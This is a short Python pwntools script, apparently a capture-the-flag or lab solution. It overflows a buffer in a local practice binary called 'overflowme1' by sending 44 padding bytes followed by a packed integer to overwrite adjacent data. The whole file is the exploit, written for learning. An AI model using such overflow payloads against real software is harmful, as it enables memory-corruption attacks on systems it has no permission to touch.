from pwn import *

context.log_level = "debug"

p = process(b"./overflowme1")

payload = b"A" * 44
payload += p64(1)
p.recvuntil(b" :\n")
p.sendline(payload)
p.recvall()
